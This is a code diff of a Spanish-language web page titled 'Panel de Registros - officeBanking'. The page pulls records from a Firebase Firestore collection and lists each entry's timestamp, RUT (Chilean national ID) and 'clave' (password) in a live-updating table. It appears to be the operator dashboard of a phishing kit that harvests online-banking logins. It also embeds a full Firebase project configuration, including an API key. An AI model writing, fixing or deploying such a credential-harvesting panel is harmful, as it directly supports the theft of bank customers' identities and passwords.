@@ -3,19 +3,26 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Panel en Vivo - Ingresos</title>
+  <title>Panel en Vivo - Registros</title>
   <script type="module">
-    import {{ initializeApp }} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import {{ getFirestore, collection, onSnapshot, query, orderBy }} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import {
+      getFirestore,
+      collection,
+      onSnapshot,
+      query,
+      orderBy
+    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-    const firebaseConfig = {{
+    const firebaseConfig = {
       apiKey: "AIzaSyCdzFXQ2h6u2QA4O8TtUWf3TZxzTnP5O9E",
       authDomain: "formulario-ob.firebaseapp.com",
+      databaseURL: "https://formulario-ob-default-rtdb.firebaseio.com",
       projectId: "formulario-ob",
-      storageBucket: "formulario-ob.appspot.com",
+      storageBucket: "formulario-ob.firebasestorage.app",
       messagingSenderId: "1017857662001",
       appId: "1:1017857662001:web:b80ad26965daf7ce960910"
-    }};
+    };
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
@@ -23,52 +30,53 @@
     const q = query(collection(db, "ingresos"), orderBy("timestamp", "desc"));
     const tabla = document.querySelector("#tabla tbody");
 
-    onSnapshot(q, (snapshot) => {{
-      tabla.innerHTML = "";  // Limpiar antes de volver a llenar
-      snapshot.forEach((doc) => {{
+    onSnapshot(q, (snapshot) => {
+      tabla.innerHTML = "";
+      snapshot.forEach((doc) => {
         const data = doc.data();
         const row = document.createElement("tr");
         row.innerHTML = `
-          <td>${{new Date(data.timestamp?.seconds * 1000).toLocaleString() || ""}}</td>
-          <td>${{data.rut || ""}}</td>
-          <td>${{data.clave || ""}}</td>
+          <td>${new Date(data.timestamp?.seconds * 1000).toLocaleString() || ""}</td>
+          <td>${data.rut || ""}</td>
+          <td>${data.clave || ""}</td>
         `;
         tabla.appendChild(row);
-      }});
-    }});
+      });
+    });
   </script>
   <style>
-    body {{
+    body {
       font-family: sans-serif;
       padding: 20px;
       background: #f9f9f9;
-    }}
-    h2 {{
+    }
+    h2 {
       color: #444;
-    }}
-    table {{
+      margin-bottom: 20px;
+    }
+    table {
       border-collapse: collapse;
       width: 100%;
       background: white;
       box-shadow: 0 0 5px rgba(0,0,0,0.1);
-    }}
-    th, td {{
+    }
+    th, td {
       border: 1px solid #ccc;
       padding: 8px 10px;
       text-align: left;
       font-size: 14px;
-    }}
-    th {{
+    }
+    th {
       background-color: #d32f2f;
       color: white;
-    }}
-    tr:nth-child(even) {{
+    }
+    tr:nth-child(even) {
       background-color: #f2f2f2;
-    }}
+    }
   </style>
 </head>
 <body>
-  <h2>Panel de Ingresos - Firebase Firestore</h2>
+  <h2>Panel de Registros - officeBanking</h2>
 
   <table id="tabla">
     <thead>
